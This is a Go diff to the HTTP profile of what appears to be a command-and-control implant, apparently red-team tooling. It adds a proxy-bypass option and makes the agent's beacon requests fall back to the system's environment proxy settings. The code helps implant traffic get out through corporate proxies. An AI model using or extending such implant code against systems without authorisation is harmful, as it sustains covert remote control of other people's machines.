@@ -67,6 +67,7 @@ var proxy_host string
 var proxy_port string
 var proxy_user string
 var proxy_pass string
+var proxy_bypass string
 
 type C2Default struct {
 	BaseURL        string
@@ -76,6 +77,7 @@ type C2Default struct {
 	ProxyURL       string
 	ProxyUser      string
 	ProxyPass      string
+	ProxyBypass    bool
 	Interval       int
 	Jitter         int
 	HeaderList     []structs.HeaderStruct
@@ -128,6 +130,9 @@ func New() Profile {
 			profile.ProxyPass = proxy_pass
 		}
 	}
+
+	// Convert ignore_proxy from string to bool
+	profile.ProxyBypass, _ = strconv.ParseBool(proxy_bypass)
 
 	if encrypted_exchange_check == "T" {
 		profile.ExchangingKeys = true
@@ -366,6 +371,9 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 		if len(c.ProxyURL) > 0 {
 			proxyURL, _ := url.Parse(c.ProxyURL)
 			tr.Proxy = http.ProxyURL(proxyURL)
+		} else if !c.ProxyBypass {
+			// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
+			tr.Proxy = http.ProxyFromEnvironment
 		}
 
 		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
@@ -438,6 +446,9 @@ func (c *C2Default) htmlGetData(requestUrl string, obody []byte) []byte {
 	if len(c.ProxyURL) > 0 {
 		proxyURL, _ := url.Parse(c.ProxyURL)
 		tr.Proxy = http.ProxyURL(proxyURL)
+	} else if !c.ProxyBypass {
+		// Check for, and use, HTTP_PROXY, HTTPS_PROXY and NO_PROXY environment variables
+		tr.Proxy = http.ProxyFromEnvironment
 	}
 
 	client := &http.Client{
